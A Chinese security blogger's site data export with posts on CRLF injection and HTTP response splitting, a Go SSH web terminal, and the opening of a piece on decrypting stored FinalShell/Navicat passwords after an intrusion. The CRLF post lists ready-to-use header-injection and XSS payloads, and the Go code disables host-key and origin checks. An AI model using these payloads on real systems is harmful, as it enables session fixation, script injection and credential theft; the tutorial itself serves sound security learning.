{"meta":{"title":"wolke","subtitle":"","description":"As the tree , so the fruit","author":"w01ke","url":"https://wolke.cn","root":"/"},"pages":[{"title":"关于我","date":"2022-11-08T11:44:03.866Z","updated":"2022-11-08T11:44:03.866Z","comments":true,"path":"about/index.html","permalink":"https://wolke.cn/about/index.html","excerpt":"","text":"一、关于我&emsp;&emsp;信息安全专业，主要学习渠道为自学，截至2022年11月份，自学安全1年半（一直以为自己是20年初开始学的安全练习两年半，结果看之前的记录是21年初开始学的安全）。 &emsp;&emsp;一个安全菜鸡，和很多师傅还有很大的差距。 &emsp;&emsp;和很多师傅一样，我也有一个安全圈子的ID——w01ke，为什么取名叫w01ke，其实很简单，当时申请的域名是wolke.cn，于是稍微修改了下就叫w01ke。 &emsp;&emsp;网站更新频率不定，时快时慢，平常主要使用语雀进行学习记录，如果您想获取更多学习文档，可关注我的语雀：https://www.yuque.com/xiaodingdang-mdzgm 二、关于博客&emsp;&emsp;我个人其实不怎么看动漫，但目前网站整体网站是偏可爱的二次元风格，因为这的确蛮可爱的😄。后面可能会考虑换一种风格，我深知目前博客很多封面、背景的选图不太好看，如果您有更好的建议，可以联系我，联系方式相信您应该可以在网站中发现。 &emsp;&emsp;网站自2021年自运营维护，主要使用组件：hexo（butterfly主题）挂载github，Cloudfare，Vercel，LeanCloud部署Valine+Artitalk。 &emsp;&emsp;如果出现图片/表情/头像加载不出来的情况，可以尝试刷新几次，如果还是加载不出来，应该是api的问题，部分表情和头像没有及时更换，依然使用的是国外的，因此国内如果不使用一些手段是无法加载国外媒体资源的，目前还在逐渐替换。 &emsp;&emsp;除了在技术文章上进行输出，我也会开启一个生活向的文章频道，分享一些月度总结性的文章，内容主要是近期动态和总结以及对未来的一些打算，做第一期时原本打算是俩月一更，现在可能主要还是看时间是否充裕，有可能会四个月写一期。开启这个频道有几方面考虑：① 记录。记录自己学习网络安全路上的一点一滴，又或者是记录自己生活的一点一滴；② 锻炼思维。开启这个频道之后，发现写点自己生活上的事情，一方面可以让自己看事情的角度更多样，另一方面是可以锻炼自己逻辑能力。写作逻辑与说话逻辑互通，有助于日常交际，又或者是面试、发言等重要场合；"},{"title":"时间轴","date":"2022-01-03T09:46:01.000Z","updated":"2022-01-03T10:22:54.756Z","comments":true,"path":"archives/index.html","permalink":"https://wolke.cn/archives/index.html","excerpt":"","text":""},{"title":"说说","date":"2021-12-06T13:05:12.000Z","updated":"2022-01-03T09:20:58.996Z","comments":true,"path":"artitalk/index.html","permalink":"https://wolke.cn/artitalk/index.html","excerpt":"","text":"new Artitalk({ appId: 'LBQq0RYOHPgeY9IIaQ60q6as-gzGzoHsz', appKey: 'pGTWd68pHbqIOVKgJFpQlwoo', serverURL: 'https://qn.wolke.cn', lang: 'zh', pageSize: 5, shuoPla: \"来说点什么吧！\", motion: 1, atComment: 1, bgImg: \"https://gitee.com/cungudafa/source/raw/master/img/gif/Sitich/Sitich16.gif\", })"},{"title":"分类","date":"2022-01-03T09:43:27.294Z","updated":"2022-01-03T09:43:27.294Z","comments":true,"path":"categories/index.html","permalink":"https://wolke.cn/categories/index.html","excerpt":"","text":""},{"title":"友链","date":"2022-01-03T09:53:52.091Z","updated":"2022-01-03T09:53:52.091Z","comments":true,"path":"link/index.html","permalink":"https://wolke.cn/link/index.html","excerpt":"","text":""},{"title":"电影","date":"2022-01-03T09:49:50.995Z","updated":"2022-01-03T09:49:50.995Z","comments":true,"path":"movies/index.html","permalink":"https://wolke.cn/movies/index.html","excerpt":"","text":""},{"title":"留言板","date":"2022-01-03T01:19:45.000Z","updated":"2022-01-03T09:37:40.237Z","comments":true,"path":"messageboard/index.html","permalink":"https://wolke.cn/messageboard/index.html","excerpt":"","text":""},{"title":"标签","date":"2022-01-03T09:48:49.311Z","updated":"2022-01-03T09:48:49.311Z","comments":true,"path":"tags/index.html","permalink":"https://wolke.cn/tags/index.html","excerpt":"","text":""},{"title":"音乐","date":"2021-12-05T17:39:17.000Z","updated":"2022-11-08T08:10:15.363Z","comments":true,"path":"music/index.html","permalink":"https://wolke.cn/music/index.html","excerpt":"","text":"屏幕左下角有一个音乐播放器喔，可查看歌单内容，选择播放顺序（默认随机播放，可选择顺序播放、单曲循环）、音量。 主要音源—— from 网易云 Emo类：国语、粤语、外语 健身类：Remix、DJ、电子音乐 俏皮阳光类：国语、外语"}],"posts":[{"title":"CRLF注入（HTTP响应拆分/截断）","slug":"CRLF注入（HTTP响应拆分-截断）","date":"2023-03-27T12:16:21.000Z","updated":"2023-03-27T12:31:45.426Z","comments":true,"path":"post/60a54be8.html","link":"","permalink":"https://wolke.cn/post/60a54be8.html","excerpt":"","text":"前言2023年HW厂商斗象面试题——CRLF注入 一、漏洞描述HTTP报文中， HTTP header之间是由一个CRLF字符序列分隔开的，HTTP Header与Body是用两个CRLF分隔的，浏览器根据这两个CRLF来取出HTTP内容并显示出来。 CRLF注入漏洞，是因为Web应用没有对用户输入做严格验证，导致攻击者可以输入一些恶意字符。攻击者一旦向请求行或首部中的字段注入恶意的CRLF，就能注入一些首部字段或报文主体，并在响应中输出，所以又称为HTTP响应拆分漏洞（HTTP Response Splitting）。 所以如果用户的输入在HTTP返回包的Header处回显，便可以通过CRLF来提前结束响应头，在响应内容处注入攻击脚本。因此CRLF Injection又叫HTTP响应拆分/截断（HTTP Response Splitting）简称HRS。 二、漏洞知识拓展CRLF指的是回车符(CR，ASCII 13，\\r，%0d) 和换行符(LF，ASCII 10，\\n，%0a)。 CRLF的概念源自打字机，表明行的结束，计算机出现后沿用了这个概念。 回车符：光标移到行首，换行符：光标垂直移到下行。 键盘上的回车键(Enter)就可以执行该操作。但是不同的操作系统，行的结束符是不一样的 Windows：使用CRLF表示行的结束Linux/Unix：使用LF表示行的结束MacOS：早期使用CR表示，现在好像也用LF表示行的结束 所以同一文件在不同操作系统中打开，内容格式可能会出现差异，这是行结束符不一致导致的。 三、漏洞检测CRLF注入漏洞的本质和XSS有点相似，攻击者将恶意数据发送给易受攻击的Web应用程序，Web应用程序将恶意数据输出在HTTP响应头中。（XSS一般输出在主体中） 所以CRLF注入漏洞的检测也和XSS漏洞的检测差不多。通过修改HTTP参数或URL，注入恶意的CRLF，查看构造的恶意数据是否在响应头中输出。 1、找到注入点，构造恶意的CRLF字符正常请求 http://wolke.cn/index.php?url=http://baidu.com 抓包，在请求行的url参数中加入特殊构造的CRLF字符 GET /index.php?url=http://baidu.com%0d%0aSet-Cookie:crlf=true HTTP/1.1Host: wolke.cnCookie: _ga=GA1.1.1945309492.1638725693; _ga_Q0YHC68NHX=GS1.1.1677577526.284.0.1677577526.0.0.0Sec-Ch-Ua: &quot;Google Chrome&quot;;v=&quot;111&quot;, &quot;Not(A:Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;111&quot;Sec-Ch-Ua-Mobile: ?0Sec-Ch-Ua-Platform: &quot;Windows&quot;Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Sec-Fetch-Site: noneSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: close 2、查看恶意数据是否在响应头中输出将修改后的请求包提交给服务器端，查看服务器端的响应。发现响应首部中多了个Set-Cookie字段。这就证实了该系统存在CRLF注入漏洞，因为我们输入的恶意数据，作为响应首部字段返回给了客户端。 HTTP/1.1 302 FoundPragma: no-cacheLocation: http://baidu.comSet-Cookie: crlf=trueContent-Length: 0Connection: closeContent-Type: text/html 很多人看到这里可能就想不明白，我请求包写入的恶意数据，怎么就被当成响应首部字段输出了？下面我们来看看服务器端源代码 if(isset($_GET[&quot;url&quot;]) &amp;&amp; ($_COOKIE[&quot;security_level&quot;]) != &quot;1&quot; &amp;&amp; $_COOkIE[&quot;security_level&quot;] != &quot;2&quot;))&#123; // Debugging // echo &quot;Not santized: &quot; . $_GET[&quot;url&quot;]; header(&quot;Location: &quot; . $_GET[&quot;url&quot;]); exit;&#125; 这是其中一段代码，用PHP写的，需要大家有一定的语言基础。这段代码的意思是：当条件满足时，将请求包中的url参数值拼接到Location字符串中，并设置成响应头发送给客户端。 此时服务器端接收到的url参数值是我们修改后的： http://baidu.com%0d%0aSet-Cookie:crlf=true 在url参数值拼接到Location字符串中，设置成响应头后，响应包此时应该是下面这样的： HTTP/1.1 302 FoundPragma: no-cacheLocation: http://baidu.com%0d%0aSet-Cookie: crlf=trueContent-Length: 0Connection: closeContent-Type: text/html %0d和%0a分别是CR和LF的URL编码。前面我们讲到，HTTP规范中，行以CRLF结束。所以当检测到%0d%0a后，就认为Location首部字段这行结束了，Set-Cookie就会被认为是下一行，如下所示 HTTP/1.1 302 FoundPragma: no-cacheLocation: http://baidu.comSet-Cookie: crlf=trueContent-Length: 0Connection: closeContent-Type: text/html 而我们构造的Set-Cookie字符在HTTP中是一个设置Cookie的首部字段，这个时候就会将crlf=true设置成Cookie。 GET /index.php?url=http://baidu.com%0d%0aSet-Cookie:crlf=true HTTP/1.1Host: wolke.cnCookie: crlf=true; _ga=GA1.1.1945309492.1638725693; _ga_Q0YHC68NHX=GS1.1.1677577526.284.0.1677577526.0.0.0Sec-Ch-Ua: &quot;Google Chrome&quot;;v=&quot;111&quot;, &quot;Not(A:Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;111&quot;Sec-Ch-Ua-Mobile: ?0Sec-Ch-Ua-Platform: &quot;Windows&quot;Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Sec-Fetch-Site: noneSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: close 重新请求，抓包，发现Cookie中多了crlf=true。 测试的用例大家可能会觉得这漏洞没什么危害性，但试想一下：利用漏洞，注入一个CRLF控制用户的Cookie，或者注入两个CRLF，控制返回给客户端的主体，该漏洞的危害不亚于XSS。 四、漏洞危害根据插入的CRLF的个数不同，可设置任意的响应头，控制响应正文两个主要的利用办法。具体的危害表现在：会话固定、XSS、缓存病毒攻击、日志伪造等等。 1、会话固定(Session Fixation)首先说说什么是会话固定攻击，会话固定攻击（session fixation attack）是利用应用系统在服务器的会话ID固定不变机制，借助他人用相同的会话ID获取认证和授权，然后利用该会话ID劫持他人的会话以成功冒充他人，造成会话固定攻击。 会话固定也是会话劫持的一种类型。会话劫持是攻击者偷走受害者与服务器建立链接的会话，而会话固定是攻击者事先建立一个会话，然后诱使受害者使用此会话进行登录，如图所示。 一个常见的跳转响应包： HTTP/1.1 302 Moved TemporarilyDate: Fri,26Jun 2018 17:00:05 GMTContent-type: text/htmlContet-Length: 155Connection: closeLocation: http://www.sinay.com.cn 当攻击者利用CRLF字符对响应头中的Location进行如下输入： %0d%0aSet-Cookie:JSPSESSID%3Dhackingsite 则返回包会变成： HTTP/1.1 302 Moved TemporarilyDate: Fri,26Jun 2018 17:00:05 GMTContent-type: text/htmlContet-Length: 155Connection: closeLocation: http://www.sinay.com.cnSet-Cookie: JSPSESSID=hackingsite 攻击者就可以给访问者设置一个session，造成“会话固定”。通过这种攻击方式可以实现插入任意响应Header。 2、反射型XSS上述案例，如果我们输入的是： %0d%0a%0d%0a&lt;img src=1 onerror=alert(/xss/)&gt; 则返回包会变为： HTTP/1.1 302 Moved TemporarilyDate: Fri,26Jun 2018 17:00:05 GMTContent-type: text/htmlContet-Length: 155Connection: closeLocation:&lt;img src=1 onerror=alert(/xss/)&gt; 浏览器会根据CRLF将http包分为header和body，然后将body中的内容执行，从而达到XSS。 从上面的案例中，如果遇到XSS过滤的情况我们还可以在httpheader中注入X-XSS-Protection: 0，可绕过浏览器的过滤规则实现XSS弹窗显示。 五、实战案例讲解1、Shopify响应拆分shopify会在后台中记录用户上次访问的是哪一个商店，然后将其放置在cookie，如访问/last_shop?xxx.shopify.com，则返回set-cookie:xxx.shopify.com，所以输入： /last_shop?xxx.shopify.com%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2019%0d%0a%0d%0a&lt;html&gt;deface&lt;/html&gt; 最终解析的结果为： Set-cookie: xxx.shopify.comContent-Length: 0HTTP/1.1 200 OKContent-Type:text/htmlContent-Length: 19&lt;html&gt;deface&lt;/html&gt; 2、Hackerone响应拆分这个案例也是302跳转类型，但略有不同，访问 info.hacker.one/%0d%0a%09headername:%20headervalue Location正常取值info.hacker.one，剩下的解析为Header头。 3、Twitter过渡绕过用户在访问https://twitter.com/i/safety/report_story 地址时，服务器会获取参数reported_tweet_id的值，并将其设置到cookie中，最后导致了漏洞。 这里Twitter禁止用户提交换行符0x0a（%0a），但通过探测，发现其后端检测逻辑为：如果提交的数据是UTF-8编码过的，则会将其解码，去除无用字符后作为cookie输出，所以如果提交%E5%98%8A，不被拦截且经Unicode解码后变为U+560A，最后取0A，同样输入%E5%98%8D最后变成0D，最终payload为： reported_tweet_id=%E5%98%8A%E5%98%8DSet-Cookie：%20test 探测漏洞存在，可进一步进行利用，输入： reported_tweet_id=test%E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert%28innerHTML%28%29%E5%98%BE 经过服务器处理后返回的数据就会变成下面的html响应的形式： Set-cookie: testcontent-type: text/htmllocation:&lt;svg/onload=alert(innerHTML)&gt; 4、WEBrick响应拆分补充一例简单的CRLF，取自CVE-2017-17742：WEBrick取get参数author作为cookie输出，访问 localhost:8080/?author=Aaron%0D%0AX-Foo:%20hacked 返回报文： 六、靶场测试利用docker搭建vulhub靶场，进入/vulhub/nginx/insecure-configuration目录 docker-compose up -d 8080端口是crlf漏洞靶场 Nginx会将$uri进行解码，导致传入%0a%0d即可引入换行符，造成CRLF注入漏洞。 错误的配置文件示例（原本的目的是为了让http的请求跳转到https上）： location / &#123; return 302 https://$host$uri;&#125; 七、挖掘技巧挖掘此类漏洞，依旧要遵循亘古不变的原则，观察我们的输入“输入“和“输出”位置，对于CRLF则是观察返回的各种类型的协议头，所以挖掘分三步： 观察输出是否在返回头中，查看输入，可能是在URL值和参数、cookie头中。在过往的挖掘过程中，最常见的两种情况是使用输入参数创建 Cookie和302跳转location处。 提交%0D%0A字符，验证服务器是否响应%0D%0A，若过滤可以通过双重编码绕过。 漏洞利用，使杀伤最大化，将漏洞转化为HTML注入，XSS，缓存等。 八、防御手段要避免http响应截断，需要注意以下几点： 对用户的数据进行合法性校验，对特殊的字符进行编码，如&lt;、&gt;、’、”、CR、LF等，限制用户输入的CR和LF，或者对CR和LF字符正确编码后再输出，以防止注入自定义HTTP头。 创建安全字符白名单，只接受白名单中的字符出现在HTTP响应头文件中。 在将数据传送到http响应头之前，删除所有的换行符。 九、CRLF Payload探测漏洞：%0d%0aheader:header%0aheader:header%0dheader:header%23%0dheader:header%3f%0dheader:header/%250aheader:header/%250aheader:header/%%0a0aheader:header/%3f%0dheader:header/%23%0dheader:header/%25%30aheader:header/%25%30%61header:header/%u000aheader:header 开放重定向：/www.google.com/%2f%2e%2e%0d%0aheader:header CRLF-XSS：%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a&lt;svg%20onload=alert(document.domain)&gt;%0d%0a0%0d%0a/%2e%2e XSS绕过：%2Fxxx:1%2F%0aX-XSS-Protection:0%0aContent-Type:text/html%0aContent-Length:39%0a%0a%3cscript%3ealert(document.cookie)%3c/ Location：%0d%0aContent-Type:%20text%2fhtml%0d%0aHTTP%2f1.1%20200%20OK%0d%0aContent-Type:%20text%2fhtml%0d%0a%0d%0a%3Cscript%3Ealert(&#x27;XSS&#x27;);%3C%2fscript%3E 十、参考链接 https://www.cnblogs.com/echojson/p/12805102.html https://www.freebuf.com/column/202762.html https://cloud.tencent.com/developer/article/1516335","categories":[{"name":"Web安全","slug":"Web安全","permalink":"https://wolke.cn/categories/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://wolke.cn/tags/Web%E5%AE%89%E5%85%A8/"}],"author":"w01ke"},{"title":"Go实现SSH远程终端及WebSocket","slug":"Go实现SSH远程终端及WebSocket","date":"2023-02-28T06:01:32.000Z","updated":"2023-02-28T06:11:34.417Z","comments":true,"path":"post/f1b02e7a.html","link":"","permalink":"https://wolke.cn/post/f1b02e7a.html","excerpt":"","text":"一、使用密码认证连接连接包含了认证，可以使用password或者sshkey 两种方式认证，下面采用密码认证方式完成连接 package mainimport ( &quot;fmt&quot; &quot;github.com/mitchellh/go-homedir&quot; &quot;golang.org/x/crypto/ssh&quot; &quot;io/ioutil&quot; &quot;log&quot; &quot;time&quot;)func main() &#123; sshHost := &quot;home&quot; sshUser := &quot;x&quot; sshPassword := &quot;xxx&quot; sshType := &quot;password&quot; // password 或者 key sshKeyPath := &quot;&quot; // ssh id_rsa.id &quot;路径 sshPort := 22 // 创建sshp登录配置 config := &amp;ssh.ClientConfig&#123; Timeout: time.Second, // ssh 连接time out时间一秒钟，如果ssh验证错误，会在一秒内返回 User: sshUser, HostKeyCallback: ssh.InsecureIgnoreHostKey(), // 这个可以，但是不够安全 // HostKeyCallback: hostKeyCallBackFunc(h.host) &#125; if sshType == &quot;password&quot; &#123; config.Auth = []ssh.AuthMethod&#123;ssh.Password(sshPassword)&#125; &#125; else &#123; config.Auth = []ssh.AuthMethod&#123;publicKeyAuthFunc(sshKeyPath)&#125; &#125; // dial 获取ssh client addr := fmt.Sprintf(&quot;%s:%d&quot;, sshHost, sshPort) sshClient, err := ssh.Dial(&quot;tcp&quot;, addr, config) if err != nil &#123; log.Fatal(&quot;创建ssh client 失败&quot;, err) &#125; defer sshClient.Close() // 创建ssh-session session, err := sshClient.NewSession() if err != nil &#123; log.Fatal(&quot;创建ssh session 失败&quot;, err) &#125; defer session.Close() // 执行远程命令 combo, err := session.CombinedOutput(&quot;whoami; cd /; ls -la&quot;) if err != nil &#123; log.Fatal(&quot;远程执行cmd失败&quot;, err) &#125; log.Println(&quot;命令输出:&quot;, string(combo))&#125;func publicKeyAuthFunc(kPath string) ssh.AuthMethod &#123; keyPath, err := homedir.Expand(kPath) if err != nil &#123; log.Fatal(&quot;find key&#x27;s home dir failed&quot;, err) &#125; key, err := ioutil.ReadFile(keyPath) if err != nil &#123; log.Fatal(&quot;ssh key file read failed&quot;, err) &#125; // Create the Signer for this private key. signer, err := ssh.ParsePrivateKey(key) if err != nil &#123; log.Fatal(&quot;ssh key signer failed&quot;, err) &#125; return ssh.PublicKeys(signer)&#125; 代码详解 配置ssh.ClientConfig 建设TimeOut自定义一个比较端的时间 自定义HostKeyCallback如果想简便就使用ssh.InsecureIgnoreHostKey回调 publicKeyAuthFunc如果使用key登录，就需要用这个函数量读取id_rsa私钥，当然您可以自定义这个访问让他支持字符串 ssh.Dial创建ssh客户端 拼接字符串得到ssh连接地址，同时不要忘记defer client.Close() sshClient.NewSession创建session会话 可以自定义stdin，stdout 可以创建pty 可以SetEnv 执行命令CombinedOutput run ... go run main.gototal 84dr-xr-xr-x. 20 root root 4096 Sep 28 09:38 .dr-xr-xr-x. 20 root root 4096 Sep 28 09:38 ..-rw-r--r-- 1 root root 0 Aug 18 2017 .autorelabellrwxrwxrwx. 1 root root 7 Aug 18 2017 bin -&gt; usr/bindr-xr-xr-x. 4 root root 4096 Sep 12 2017 bootdrwxrwxr-x 2 rsync rsync 4096 Jul 29 23:37 datadrwxr-xr-x 19 root root 2980 Jul 28 13:29 devdrwxr-xr-x. 95 root root 12288 Nov 5 23:46 etcdrwxr-xr-x. 5 root root 4096 Nov 3 16:11 homelrwxrwxrwx. 1 root root 7 Aug 18 2017 lib -&gt; usr/liblrwxrwxrwx. 1 root root 9 Aug 18 2017 lib64 -&gt; usr/lib64drwx------. 2 root root 16384 Aug 18 2017 lost+founddrwxr-xr-x. 2 root root 4096 Nov 5 2016 mediadrwxr-xr-x. 3 root root 4096 Jul 28 21:01 mntdrwxr-xr-x 4 root root 4096 Sep 28 09:38 nginx_testdrwxr-xr-x. 8 root root 4096 Nov 3 16:10 optdr-xr-xr-x 87 root root 0 Jul 28 13:26 procdr-xr-x---. 18 root root 4096 Nov 4 00:38 rootdrwxr-xr-x 27 root root 860 Nov 4 21:57 runlrwxrwxrwx. 1 root root 8 Aug 18 2017 sbin -&gt; usr/sbindrwxr-xr-x. 2 root root 4096 Nov 5 2016 srvdr-xr-xr-x 13 root root 0 Jul 28 21:26 sysdrwxrwxrwt. 8 root root 4096 Nov 5 03:09 tmpdrwxr-xr-x. 13 root root 4096 Aug 18 2017 usrdrwxr-xr-x. 21 root root 4096 Nov 3 16:10 var 二、WebSocket简介HTML5开始提供的一种浏览器与服务器进行双工通讯的网络技术，属于应用层协议，它基于TCP传输协议，并复用HTTP的握手通道： 对大部分web开发者来说，上面描述有点枯燥，只需要记下以下三点 1. WebSocket可以在浏览器里使用2. 支持双向通信3. 使用很简单 对比HTTP协议的话，概括的说就是: 支持双向通信，更灵活，更高效，可扩展性更好 1. 支持双向通信,实时性更强2. 更好的二进制支持3. 较少的控制开销,连接创建后,客户端和服务端进行数据交换时,协议控制的数据包头部较小,在不包含头部的情况下,服务端到客户端的包头只有2-10字节(取决于数据包长度), 客户端到服务端的话,需要加上额外4字节的掩码,而HTTP每次同年高新都需要携带完整的头部4. 支持扩展,ws协议定义了扩展, 用户可以扩展协议, 或者实现自定义的子协议 三、基于Web的Terminal终端控制台1、解决问题完成这样一个Web Terminal的目的主要是解决几个问题： 1.一定程度上取代xshell，secureRT，putty等ssh终端2.方便身份认证，访问控制3.方便使用，不受电脑环境的影响 2、数据流向要实现远程登录的功能，其数据流向大概为 浏览器 &lt;--&gt; WebSocket &lt;---&gt; SSH &lt;---&gt; Linux OS 实现流程 浏览器将主机的信息(ip, 用户名, 密码, 请求的终端大小等)进行加密，传给后台, 并通过HTTP请求与后台协商升级协议。协议升级完成后，后续的数据交换则遵照web Socket的协议。 后台将HTTP请求升级为web Socket协议，得到一个和浏览器数据交换的连接通道 后台将数据进行解密拿到主机信息，创建一个SSH 客户端，与远程主机的SSH 服务端协商加密，互相认证, 然后建立一个SSH Channel 后台和远程主机有了通讯的信道, 然后后台将终端的大小等信息通过SSH Channel请求远程主机创建一个 pty(伪终端)，并请求启动当前用户的默认 shell 后台通过 Socket连接通道拿到用户输入，再通过SSH Channel将输入传给pty，pty将这些数据交给远程主机处理后按照前面指定的终端标准输出到SSH Channel中，同时键盘输入也会发送给SSH Channel 后台从SSH Channel中拿到按照终端大小的标准输出后又通过Socket连接将输出返回给浏览器，由此变实现了Web Terminal 3、代码实现照上面的使用流程基于代码解释如何实现 （1）升级HTTP协议为WebSocketvar upgrader = websocket.Upgrader&#123; ReadBufferSize: 1024, WriteBufferSize: 1024, CheckOrigin: func(r *http.Request) bool &#123; return true &#125;,&#125; （2）升级协议并获得socket连接conn就是socket连接通道，接下来后台和浏览器之间的通讯都将基于这个通道 conn, err := upgrader.Upgrade(c.Writer, c.Request, nil)if err != nil &#123; c.Error(err) return&#125; （3）后台拿到主机信息，建立ssh客户端ssh客户端结构体 type SSHClient struct &#123; Username string `json:&quot;username&quot;` Password string `json:&quot;password&quot;` IpAddress string `json:&quot;ipaddress&quot;` Port int `json:&quot;port&quot;` Session *ssh.Session Client *ssh.Client channel ssh.Channel&#125;//创建新的ssh客户端时, 默认用户名为root, 端口为22func NewSSHClient() SSHClient &#123; client := SSHClient&#123;&#125; client.Username = &quot;root&quot; client.Port = 22 return client&#125; 初始化的时候我们只有主机的信息，而Session，client，channel都是空的，现在先生成真正的client func (this *SSHClient) GenerateClient() error &#123; var ( auth []ssh.AuthMethod addr string clientConfig *ssh.ClientConfig client *ssh.Client config ssh.Config err error ) auth = make([]ssh.AuthMethod, 0) auth = append(auth, ssh.Password(this.Password)) config = ssh.Config&#123; Ciphers: []string&#123;&quot;aes128-ctr&quot;, &quot;aes192-ctr&quot;, &quot;aes256-ctr&quot;, &quot;aes128-gcm@openssh.com&quot;, &quot;arcfour256&quot;, &quot;arcfour128&quot;, &quot;aes128-cbc&quot;, &quot;3des-cbc&quot;, &quot;aes192-cbc&quot;, &quot;aes256-cbc&quot;&#125;, &#125; clientConfig = &amp;ssh.ClientConfig&#123; User: this.Username, Auth: auth, Timeout: 5 * time.Second, Config: config, HostKeyCallback: func(hostname string, remote net.Addr, key ssh.PublicKey) error &#123; return nil &#125;, &#125; addr = fmt.Sprintf(&quot;%s:%d&quot;, this.IpAddress, this.Port) if client, err = ssh.Dial(&quot;tcp&quot;, addr, clientConfig); err != nil &#123; return err &#125; this.Client = client return nil&#125; ssh.Dial(&quot;tcp&quot;, addr, clientConfig)创建连接并返回客户端，如果主机信息不对或其它问题这里将直接失败 （4）通过ssh客户端创建ssh channel，并请求一个pty伪终端，请求用户的默认会话如果主机信息验证验证通过，可以通过ssh client创建一个通道： channel, inRequests, err := this.Client.OpenChannel(&quot;session&quot;, nil)if err != nil &#123; log.Println(err) return nil&#125;this.channel = channel ssh通道创建完成后，请求一个标准输出的终端，并开启用户的默认shell： ok, err := channel.SendRequest(&quot;pty-req&quot;, true, ssh.Marshal(&amp;req))if !ok || err != nil &#123; log.Println(err) return nil&#125;ok, err = channel.SendRequest(&quot;shell&quot;, true, nil)if !ok || err != nil &#123; log.Println(err) return nil&#125; （5）远程主机与浏览器实时数据交换现在为止建立了两个通道，一个是websocket，一个是ssh channel，后台将起两个主要的协程，一个不停的从websocket通道里读取用户的输入，并通过ssh channel传给远程主机： // 这里第一个协程获取用户的输入go fun() &#123; // p 为用户输入 _, p, err := ws.ReadMessage() if err != nil &#123; return &#125; _, err = this.channel.Write(p) if err != nil &#123; return &#125; &#125;&#125;() 第二个主协程将远程主机的数据传递给浏览器，在这个协程里还将起一个协程，不断获取ssh channel里的数据并传给后台内部创建的一个通道，主协程则有一个死循环，每隔一段时间从内部通道里读取数据，并将其通过websocket传给浏览器，所以数据传输并不是真正实时的，而是有一个间隔在，我写的默认为100微秒，这样基本感受不到延迟，而且减少了消耗，有时浏览器输入一个命令获取大量数据时，会感觉数据出现会一顿一顿的便是因为设置了一个间隔： //第二个协程将远程主机的返回结果返回给用户go func() &#123; br := bufio.NewReader(this.channel) buf := []byte&#123;&#125; t := time.NewTimer(time.Microsecond * 100) defer t.Stop() // 构建一个信道, 一端将数据远程主机的数据写入, 一段读取数据写入ws r := make(chan rune) // 另起一个协程, 一个死循环不断的读取ssh channel的数据, 并传给r信道直到连接断开 go func() &#123; defer this.Client.Close() defer this.Session.Close() for &#123; x, size, err := br.ReadRune() if err != nil &#123; log.Println(err) ws.WriteMessage(1, []byte(&quot;\\033[31m已经关闭连接!\\033[0m&quot;)) ws.Close() return &#125; if size &gt; 0 &#123; r &lt;- x &#125; &#125; &#125;() // 主循环 for &#123; select &#123; // 每隔100微秒, 只要buf的长度不为0就将数据写入ws, 并重置时间和buf case &lt;-t.C: if len(buf) != 0 &#123; err := ws.WriteMessage(websocket.TextMessage, buf) buf = []byte&#123;&#125; if err != nil &#123; log.Println(err) return &#125; &#125; t.Reset(time.Microsecond * 100) // 前面已经将ssh channel里读取的数据写入创建的通道r, 这里读取数据, 不断增加buf的长度, 在设定的 100 microsecond后由上面判定长度是否返送数据 case d := &lt;-r: if d != utf8.RuneError &#123; p := make([]byte, utf8.RuneLen(d)) utf8.EncodeRune(p, d) buf = append(buf, p...) &#125; else &#123; buf = append(buf, []byte(&quot;@&quot;)...) &#125; &#125; &#125;&#125;() 4、web-terminal（1）前端git clone https://github.com/chengjoey/web-terminal-client.gitcd web-terminal-client# install dependenciesnpm install# serve with hot reload at localhost:8080npm run dev// 需要的话就执行，不需要的话运行npm run dev即可启动前端了# build for production with minificationnpm run build# build for production and view the bundle analyzer reportnpm run build --report （2）后端go get github.com/chengjoey/web-terminalLinux： web-terminalWindows: web-terminal.exe （3）使用访问http://127.0.0.1:5001/ ，即可进行连接和shell操作 四、参考链接https://www.cnblogs.com/you-men/p/13934845.html https://mojotv.cn/2019/05/22/golang-ssh-session","categories":[{"name":"Go","slug":"Go","permalink":"https://wolke.cn/categories/Go/"}],"tags":[{"name":"Go","slug":"Go","permalink":"https://wolke.cn/tags/Go/"}],"author":"w01ke"},{"title":"内网常用工具密码解密【扩大战果】","slug":"内网常用工具密码解密【扩大战果】","date":"2023-02-20T02:37:51.000Z","updated":"2023-02-20T02:47:33.085Z","comments":true,"path":"post/37cc6900.html","link":"","permalink":"https://wolke.cn/post/37cc6900.html","excerpt":"","text":"一、前言当通过一些方法拿到系统权限后，系统中可能存在连接其他服务器、数据库的远程管理软件，这时候就需要去解密像ssh这类的连接软件，获取更多主机得权限来扩大战果。 二、运维软件当我通过一个MS-17-010漏洞RDP到内网运维主机上面，发现桌面有Navicat（数据库管理工具）和FinalShell（服务器远程管理工具）。当然咱要想办法解密软件连接过的服务器和数据库的密码获得更多分数。 1、FinalShellFinalShell是一体化的的服务器网络管理软件，不仅是ssh客户端，还是功能强大的开发、运维工具，充分满足开发、运维需求。 2、NavicatNavicat是一套可创建多个连接的数据库管理工具，用以方便管理 